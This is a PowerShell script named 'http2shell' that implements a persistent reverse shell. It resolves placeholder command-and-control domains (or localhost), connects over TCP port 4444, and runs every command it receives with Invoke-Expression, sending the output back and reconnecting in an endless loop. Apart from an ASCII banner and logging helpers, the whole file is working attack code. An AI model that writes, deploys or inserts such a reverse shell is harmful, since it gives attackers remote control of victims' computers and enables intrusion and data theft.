$C2HttpsDomain   = "yourc2httpsdomain.com"
$C2HttpDomain    = "yourc2httpdomain.com"
$C2DefaultDomain = "127.0.0.1"
$Port            = 4444

$Reset     = "`e[0m"
$Red       = "`e[31m"
$DarkGreen = "`e[38;5;22m"
$Orange    = "`e[38;5;208m"
$White     = "`e[37m"
$Bold      = "`e[1m"
$Dim       = "`e[2m"
$Italic    = "`e[3m"

$Banner = @"

$Bold
${Orange}    __    __  __       ${Red} ___${Orange}        __         ____
${Orange}   / /_  / /_/ /_____ ${Red} |__ \${Orange} _____/ /_  ___  / / /
${Orange}  / __ \/ __/ __/ __ \${Red} __/ /${Orange}/ ___/ __ \/ _ \/ / /
${Orange} / / / / /_/ /_/ /_/ /${Red}/___/${Orange}(__  ) / / /  __/ / /
${Orange}/_/ /_/\__/\__/ .___/${Red}/____/${Orange}____/_/ /_/\___/_/_/
${Orange}             /_/
${Bold}${Red}  + ${Dim}${White}${Italic}http2shell${Reset}
${Bold}${Red}  + ${Dim}${White}${Italic}author: tom7${Reset}
${Bold}${Red}  + ${Dim}${White}${Italic}github: https://github.com/tom7voldemort${Reset}
${Bold}${Red}  + ${Dim}${White}${Italic}version: 1.2${Reset}
$Reset
"@

function TypeWrite {
    param($Msg, $Delay = 10)
    foreach ($Ch in $Msg.ToCharArray()) {
        [Console]::Write($Ch)
        Start-Sleep -Milliseconds $Delay
    }
    Write-Host ""
}

function Info     { param($Msg); TypeWrite "${Bold}${Dim}${White}[${DarkGreen}info +${White}] $Msg${Reset}" }
function Warnings { param($Msg); TypeWrite "${Bold}${Dim}${White}[${Orange}warn !${White}] $Msg${Reset}" }
function Errors   { param($Msg); TypeWrite "${Bold}${Dim}${White}[${Red}error x${White}] $Msg${Reset}" }

function Resolve {
    foreach ($Domain in @($C2HttpsDomain, $C2HttpDomain, $C2DefaultDomain)) {
        try {
            $Ip = [System.Net.Dns]::GetHostAddresses($Domain)[0].IPAddressToString
            Info "resolved $Domain -> $Ip"
            return $Ip
        } catch {
            continue
        }
    }
    return $null
}

function Spawn {
    param($Ip, $Port)
    Info "spawning shell to ${Ip}:${Port}"
    try {
        $Client = New-Object Net.Sockets.TCPClient($Ip, $Port)
        $Stream = $Client.GetStream()
        [byte[]]$Buf = 0..65535 | ForEach-Object { 0 }
        while (($I = $Stream.Read($Buf, 0, $Buf.Length)) -ne 0) {
            $Data = (New-Object Text.ASCIIEncoding).GetString($Buf, 0, $I)
            $Send = (Invoke-Expression $Data 2>&1 | Out-String)
            $Reply = $Send + "PS " + (Get-Location).Path + "> "
            $Bytes = ([Text.Encoding]::ASCII).GetBytes($Reply)
            $Stream.Write($Bytes, 0, $Bytes.Length)
            $Stream.Flush()
        }
        $Client.Close()
        return $true
    } catch {
        return $false
    }
}

function Exploit {
    while ($true) {
        try {
            $Ip = Resolve
            if (-not $Ip) {
                Errors "no server active. retrying..."
                Start-Sleep -Seconds 3
                continue
            }
            Info "target server: ${Ip}:${Port}"
            Info "starting shell session..."
            $Ok = Spawn $Ip $Port
            if ($Ok) {
                Info "shell session ended. reconnecting..."
            } else {
                Warnings "bad connection. retrying..."
            }
            Start-Sleep -Milliseconds 500
        } catch {
            Start-Sleep -Milliseconds 500
        }
    }
}

Clear-Host
Write-Host $Banner
Exploit
